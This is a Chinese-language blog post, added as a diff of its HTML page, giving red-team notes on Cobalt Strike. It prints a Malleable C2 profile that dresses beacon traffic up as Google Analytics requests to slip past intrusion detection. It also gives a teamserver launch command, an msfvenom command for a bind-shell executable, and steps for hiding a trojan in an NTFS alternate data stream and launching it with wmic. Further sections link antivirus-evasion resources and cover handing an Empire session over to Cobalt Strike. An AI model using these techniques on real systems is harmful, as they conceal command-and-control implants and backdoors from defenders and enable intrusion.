@@ -1,0 +1,692 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CobaltStrike学习笔记续三">
+<meta property="og:url" content="http://yoursite.com/2018/06/13/CobaltStrike学习笔记续三/index.html">
+<meta property="og:site_name" content="EvilAnne's Blog">
+<meta property="og:description">
+<meta property="og:image" content="https://i.imgur.com/mbK2lOe.jpg">
+<meta property="og:image" content="https://i.imgur.com/48mKi0F.jpg">
+<meta property="og:image" content="https://i.imgur.com/OoKU8VX.jpg">
+<meta property="og:image" content="https://i.imgur.com/C3ORFVU.jpg">
+<meta property="og:image" content="https://i.imgur.com/hEbkGnh.jpg">
+<meta property="og:image" content="https://i.imgur.com/Fug2ulv.jpg">
+<meta property="og:image" content="https://i.imgur.com/dWe4Ntx.jpg">
+<meta property="og:image" content="https://i.imgur.com/9ntLJzr.jpg">
+<meta property="og:image" content="https://i.imgur.com/vzOIKFi.jpg">
+<meta property="og:image" content="https://i.imgur.com/rZhVmrm.jpg">
+<meta property="og:image" content="https://i.imgur.com/KgaHGL5.jpg">
+<meta property="og:image" content="https://i.imgur.com/JMA8ZEm.jpg">
+<meta property="og:image" content="https://i.imgur.com/aJTPghn.jpg">
+<meta property="og:image" content="https://i.imgur.com/b9QKVpi.jpg">
+<meta property="og:image" content="https://i.imgur.com/Uqs63nM.jpg">
+<meta property="og:image" content="https://i.imgur.com/lRgmONz.jpg">
+<meta property="og:image" content="https://i.imgur.com/s6HG68l.jpg">
+<meta property="og:image" content="https://i.imgur.com/c9SaGZP.jpg">
+<meta property="og:image" content="https://i.imgur.com/XHq6l8n.jpg">
+<meta property="og:updated_time" content="2018-06-13T13:24:47.237Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CobaltStrike学习笔记续三">
+<meta name="twitter:description">
+<meta name="twitter:image" content="https://i.imgur.com/mbK2lOe.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: '博主'
+    }
+  };
+</script>
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+  <title> CobaltStrike学习笔记续三 | EvilAnne's Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">EvilAnne's Blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                CobaltStrike学习笔记续三
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2018-06-13T21:20:02+08:00" content="2018-06-13">
+              2018-06-13
+            </time>
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2018/06/13/CobaltStrike学习笔记续三/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2018/06/13/CobaltStrike学习笔记续三/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img src="https://i.imgur.com/mbK2lOe.jpg" alt=""></p>
+<a id="more"></a>
+<h3 id="C2"><a href="#C2" class="headerlink" title="C2"></a>C2</h3><p>Cobalt Strike新添加的扩展名为“External C2”,创造隐蔽的C2通道。<br>即支持：HTTP/HTTPS以及DNS协议</p>
+<p>其它远控的协议多为硬编码,在计算机程序或文本编辑中，硬编码是指将可变变量用一个固定值来代替的方法。用这种方法编译后，如果以后需要更改此变量就非常困难了。<br>所以很容易被ids等检测出来;</p>
+<p>没修改之前默认编码：<br><img src="https://i.imgur.com/48mKi0F.jpg" alt=""></p>
+<p><a href="https://github.com/rsmudge/Malleable-C2-Profiles" target="_blank" rel="external">https://github.com/rsmudge/Malleable-C2-Profiles</a></p>
+<p>webbug.profile</p>
+<figure class="highlight profile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"># make our C2 look like a Google Web Bug</span><br><span class="line"># https://developers.google.com/analytics/resources/articles/gaTrackingTroubleshooting</span><br><span class="line">#</span><br><span class="line"># Author: @armitagehacker</span><br><span class="line"></span><br><span class="line">http-get &#123;</span><br><span class="line">	set uri <span class="string">"/__utm.gif"</span>;</span><br><span class="line">	client &#123;</span><br><span class="line">		parameter <span class="string">"utmac"</span> <span class="string">"UA-2202604-2"</span>;</span><br><span class="line">		parameter <span class="string">"utmcn"</span> <span class="string">"1"</span>;</span><br><span class="line">		parameter <span class="string">"utmcs"</span> <span class="string">"ISO-8859-1"</span>;</span><br><span class="line">		parameter <span class="string">"utmsr"</span> <span class="string">"1280x1024"</span>;</span><br><span class="line">		parameter <span class="string">"utmsc"</span> <span class="string">"32-bit"</span>;</span><br><span class="line">		parameter <span class="string">"utmul"</span> <span class="string">"en-US"</span>;</span><br><span class="line"></span><br><span class="line">		metadata &#123;</span><br><span class="line">			netbios;</span><br><span class="line">			prepend <span class="string">"__utma"</span>;</span><br><span class="line">			parameter <span class="string">"utmcc"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	server &#123;</span><br><span class="line">		header <span class="string">"Content-Type"</span> <span class="string">"image/gif"</span>;</span><br><span class="line"></span><br><span class="line">		output &#123;</span><br><span class="line">			# hexdump pixel.gif</span><br><span class="line">			# 0000000 47 49 46 38 39 61 01 00 01 00 80 00 00 00 00 00</span><br><span class="line">			# 0000010 ff ff ff 21 f9 04 01 00 00 00 00 2c 00 00 00 00</span><br><span class="line">			# 0000020 01 00 01 00 00 02 01 44 00 3b </span><br><span class="line"></span><br><span class="line">			prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";</span><br><span class="line">			prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";</span><br><span class="line">			prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";</span><br><span class="line"></span><br><span class="line">			print;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-post &#123;</span><br><span class="line">	set uri "/___utm.gif";</span><br><span class="line">	client &#123;</span><br><span class="line">		header "Content-Type" "application/octet-stream";</span><br><span class="line"></span><br><span class="line">		id &#123;</span><br><span class="line">			prepend "UA-220";</span><br><span class="line">			append "-2";</span><br><span class="line">			parameter "utmac";</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		parameter "utmcn" "1";</span><br><span class="line">		parameter "utmcs" "ISO-8859-1";</span><br><span class="line">		parameter "utmsr" "1280x1024";</span><br><span class="line">		parameter "utmsc" "32-bit";</span><br><span class="line">		parameter "utmul" "en-US";</span><br><span class="line"></span><br><span class="line">		output &#123;</span><br><span class="line">			print;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	server &#123;</span><br><span class="line">		header "Content-Type" "image/gif";</span><br><span class="line"></span><br><span class="line">		output &#123;</span><br><span class="line">			prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";</span><br><span class="line">			prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";</span><br><span class="line">			prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";</span><br><span class="line">			print;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># dress up the staging process too</span><br><span class="line">http-stager &#123;</span><br><span class="line">	server &#123;</span><br><span class="line">		header "Content-Type" "image/gif";</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>./c2lint ./Malleable-C2-Profiles/normal/webbug.profile</code><br><img src="https://i.imgur.com/OoKU8VX.jpg" alt=""></p>
+<p>根据情况自己选择：<br><img src="https://i.imgur.com/C3ORFVU.jpg" alt=""></p>
+<p><code>./teamserver 192.168.4.4 password ./Malleable-C2-Profiles/normal/webbug.profile</code><br>通过<code>--profile google.profile</code>来修改编码方式以免被检测出来;<br>已经改变了编码等其它信息;<br><img src="https://i.imgur.com/hEbkGnh.jpg" alt=""></p>
+<p><a href="https://blog.cobaltstrike.com/2015/04/23/user-defined-storage-based-covert-communication/" target="_blank" rel="external">https://blog.cobaltstrike.com/2015/04/23/user-defined-storage-based-covert-communication/</a><br><a href="https://github.com/rsmudge/Malleable-C2-Profiles" target="_blank" rel="external">https://github.com/rsmudge/Malleable-C2-Profiles</a><br><a href="https://www.cobaltstrike.com/help-malleable-c2" target="_blank" rel="external">https://www.cobaltstrike.com/help-malleable-c2</a></p>
+<h3 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h3><p>关于msf反弹后门的免杀Tips<br><a href="http://hacktech.cn/2017/04/20/msf-AntiVirus.html" target="_blank" rel="external">http://hacktech.cn/2017/04/20/msf-AntiVirus.html</a><br><a href="https://www.bilibili.com/video/av9975200/" target="_blank" rel="external">https://www.bilibili.com/video/av9975200/</a><br><a href="https://blog.csdn.net/mickeymouse1928/article/details/71160027" target="_blank" rel="external">https://blog.csdn.net/mickeymouse1928/article/details/71160027</a></p>
+<p>使用shellcode打造MSF免杀payload<br><a href="http://www.91ri.org/14240.html" target="_blank" rel="external">http://www.91ri.org/14240.html</a></p>
+<p>免杀<br><a href="https://github.com/Veil-Framework/Veil" target="_blank" rel="external">https://github.com/Veil-Framework/Veil</a><br><a href="https://evi1cg.me/archives/bypassAV_hanzoInjection.html" target="_blank" rel="external">https://evi1cg.me/archives/bypassAV_hanzoInjection.html</a></p>
+<h3 id="Empire结合"><a href="#Empire结合" class="headerlink" title="Empire结合"></a>Empire结合</h3><p>已通过Empire控制权限 移植到CobaltStrike</p>
+<p><img src="https://i.imgur.com/Fug2ulv.jpg" alt=""><br>利用invoke_shellcode模块</p>
+<p><img src="https://i.imgur.com/dWe4Ntx.jpg" alt=""><br><img src="https://i.imgur.com/9ntLJzr.jpg" alt=""><br><img src="https://i.imgur.com/vzOIKFi.jpg" alt=""></p>
+<p>非常简单</p>
+<h3 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h3><h4 id="MSF-通过ACL隐藏Bind-Shell"><a href="#MSF-通过ACL隐藏Bind-Shell" class="headerlink" title="MSF 通过ACL隐藏Bind Shell"></a>MSF 通过ACL隐藏Bind Shell</h4><p><img src="https://i.imgur.com/rZhVmrm.jpg" alt=""><br>msfvenom -p   LPORT=8889 AHOST=192.168.52.129 -f exe &gt; hidden_shell.exe</p>
+<p><img src="https://i.imgur.com/KgaHGL5.jpg" alt=""></p>
+<p><img src="https://i.imgur.com/JMA8ZEm.jpg" alt=""><br><img src="https://i.imgur.com/aJTPghn.jpg" alt=""><br>退出后shell.exe会自动结束,无法再继续连接;<br>效果不理想；<br><img src="https://i.imgur.com/b9QKVpi.jpg" alt=""></p>
+<p>只有指定的机器才能telnet访问</p>
+<h4 id="cobaltstrike结合ADS"><a href="#cobaltstrike结合ADS" class="headerlink" title="cobaltstrike结合ADS"></a>cobaltstrike结合ADS</h4><p><a href="https://evi1cg.me/archives/ADS.html" target="_blank" rel="external">渗透中的ADS</a></p>
+<p>NTFS因为它的稳定性强大的功能，以及它所提供的安全性而成为一种更优越的文件系统 ，NTFS交换数据 流（ADSs）是为了和Macintosh的HFS文件系统兼容，它使用资源resource forks来维持与文件相关的信息<br>系统一直以来都有允许创建ADSs以及在这种流文件中执行隐藏代码的功能和工具Microsoft KnowledgeBase</p>
+<ul>
+<li>经典的IIS 目录访问权限绕过</li>
+<li>Bypass 黑名单验证</li>
+<li>webshell隐藏</li>
+<li>UDF提权中的利用</li>
+<li>利用ADS隐藏木马</li>
+</ul>
+<p>这里就是通过ADS来隐藏我们的CobaltStrike马;</p>
+<p>ADS创建：</p>
+<p><code>echo this is an ADS &gt; myfile:txt:hidden</code></p>
+<p>通过另外个文件来创建<br><code>echo this adss &gt; test.txt</code><br><code>type test &gt; myfile.txt:hidden</code></p>
+<p>任何二进制信息的流都可以组成一个文件，而且ADS也就是一个文件而已，可执行东西也能够相当 容易 的隐藏在ads中</p>
+<p><code>type c:\winnt\notepad.exe &gt; myfile.txt:np.exe</code></p>
+<p>shell dir C:\PerfLogs\</p>
+<p><img src="https://i.imgur.com/Uqs63nM.jpg" alt=""><br>shell.exe是我上传的木马或者其它工具, 而Admin这个目录是系统自己创建的;</p>
+<p>shell type C:\PerfLogs\shell.exe &gt; C:\PerfLogs\Admin:1.exe<br>shell dir /r C:\PerfLogs\Admin<br><img src="https://i.imgur.com/lRgmONz.jpg" alt=""></p>
+<p>WMIC来执行<br><code>wmic process call create C:\PerfLogs\Admin:1.exe</code></p>
+<p>CobaltStrike下执行<br><code>execute C:\PerfLogs\Admin:1.exe</code></p>
+<h4 id="一些插件"><a href="#一些插件" class="headerlink" title="一些插件"></a>一些插件</h4><p><a href="https://github.com/harleyQu1nn/AggressorScripts" target="_blank" rel="external">https://github.com/harleyQu1nn/AggressorScripts</a></p>
+<p><code>AVQuery.cna</code><br>使用powershell查询目标上安装的所有的杀毒软件</p>
+<p>Cobalt Strike -&gt; Script Manager<br><img src="https://i.imgur.com/s6HG68l.jpg" alt=""></p>
+<p>感觉并不实用,实际对各类比较出名的杀毒软件都熟悉的话直接查看进程就可以识别出来了;</p>
+<p>RedTeamRepo.cna<br>各类命令和tips<br><img src="https://i.imgur.com/c9SaGZP.jpg" alt=""></p>
+<p><img src="https://i.imgur.com/XHq6l8n.jpg" alt=""></p>
+<p>其它插件自己慢慢尝试;</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/05/28/2018-5月资源汇总/" rel="next" title="2018-5月资源汇总">
+                <i class="fa fa-chevron-left"></i> 2018-5月资源汇总
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/07/01/2018-6-月资源汇总/" rel="prev" title="2018-6 月资源汇总">
+                2018-6 月资源汇总 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2018/06/13/CobaltStrike学习笔记续三/"
+           data-title="CobaltStrike学习笔记续三" data-url="http://yoursite.com/2018/06/13/CobaltStrike学习笔记续三/">
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="EvilAnne" />
+          <p class="site-author-name" itemprop="name">EvilAnne</p>
+          <p class="site-description motion-element" itemprop="description">比天赋更重要的是变强起来的勇气</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">128</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">11</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">8</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#C2"><span class="nav-number">1.</span> <span class="nav-text">C2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#免杀"><span class="nav-number">2.</span> <span class="nav-text">免杀</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Empire结合"><span class="nav-number">3.</span> <span class="nav-text">Empire结合</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Other"><span class="nav-number">4.</span> <span class="nav-text">Other</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#MSF-通过ACL隐藏Bind-Shell"><span class="nav-number">4.1.</span> <span class="nav-text">MSF 通过ACL隐藏Bind Shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#cobaltstrike结合ADS"><span class="nav-number">4.2.</span> <span class="nav-text">cobaltstrike结合ADS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#一些插件"><span class="nav-number">4.3.</span> <span class="nav-text">一些插件</span></a></li></ol></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">EvilAnne</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+  <span id="busuanzi_container_site_pv">访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"http://evilanne.duoshuo.com"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+      
+      <script src="/vendors/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
+      <script src="/js/src/hook-duoshuo.js"></script>
+    
+  
+
+
+
+
+
+  
+  
+  
+
+  
+
+  
+ 
+  
+
+</body>
+</html>
